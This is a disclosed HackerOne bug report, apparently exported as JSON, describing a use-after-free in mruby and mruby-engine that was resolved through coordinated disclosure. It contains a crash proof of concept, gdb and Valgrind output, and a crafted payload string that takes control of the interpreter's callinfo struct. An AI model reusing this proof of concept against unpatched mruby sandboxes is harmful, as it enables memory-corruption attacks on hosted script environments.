{
  "id": 213261,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTMyNjE=",
  "url": "https://hackerone.com/reports/213261",
  "title": "Use-after-free leading to an invalid pointer dereference",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-03-14T00:21:30.366Z",
  "submitted_at": "2017-03-14T00:21:30.366Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dgaletic",
    "url": "/dgaletic",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-04-02T13:29:48.105Z",
  "bug_reporter_agreed_on_going_public_at": "2017-04-02T13:29:48.040Z",
  "team_member_agreed_on_going_public_at": "2017-03-28T21:18:46.132Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "PoC\n===\n\nThe following code demonstrates a crash:\n\n    class A < def to_str\n      \"\"[1, 2, 3]\n      ensure --> {} rescue\n      Struct.new.new.to_h\n      end\n    end\n\nDiscussion\n==========\n    \nmruby crashes due to an invalid pointer dereference in vm.c:1692:\n\n    1689│       L_RESCUE:\n    1690│         if (ci->ridx == 0) goto L_STOP;\n    1691│         proc = ci->proc;\n    1692├>        irep = proc->body.irep;\n\n(gdb) print ci->proc\n$3 = (struct RProc *) 0x511\n\nmruby-engine crashes similarly in class.h:50:\n\n    50├>    return mrb_obj_ptr(v)->c;\n    51│   }\n    52│ }\n\n(gdb) print mrb_obj_ptr(v)\n$2 = (struct RObject *) 0x6\n\nValgrind reports many (3032 errors from 108 contexts) invalid reads and writes happening inside memory free'd by a realloc. We were able to exploit this to achieve control over the callinfo struct in mruby, as demonstrated here on `proc`:\n\n    class A < def to_str\n    a = \"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEp\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fsAEtAEuAEvAEwAExX\\xe5\\xfc\\xff\\xff\\x6f\\x00\\x001AE2AE3AE4AE5AE6AE7AE8AE\\x90\\xe0n\\x00\\x00\\x00\\x00\\x00FCAFDAFEAFFA\\x00\\x00\\x00\\x00HAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFk\" * 4\n      \"\"[1, 2, 3]\n      ensure --> {} rescue\n      Struct.new.new.to_h\n      end\n    end\n    \nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000041f164 in mrb_vm_exec (mrb=0x6af010, proc=0xf0f0f0f0f0f0f0f, pc=0x71dd18) at /home/<user>/repos/mruby/src/vm.c:1692\n(gdb) print *ci\n$3 = {mid = 1161915973, proc = 0xf0f0f0f0f0f0f0f, stackent = 0x4175454174454173, nregs = 1161918021, ridx = 2017804663, eidx = -203432, env = 0x4133454132454131, pc =0x3645413545413445, err = 0x4541384541374541, argc = 7266448, acc = 0, target_class = 0x4546414446414346}\n\nWe will continue working on this bug to see whether the same can be achieved in mruby-engine.\n\nThank you,\nDinko Galetic\nDenis Kasak",
  "bounty_amount": "800.0",
  "formatted_bounty": "$800",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-04-27T21:18:46.168Z",
  "allow_singular_disclosure_after": -214499901.33377716,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "delimitry",
    "dgaletic",
    "red4sec",
    "eveeez",
    "cyberunit",
    "linkks",
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
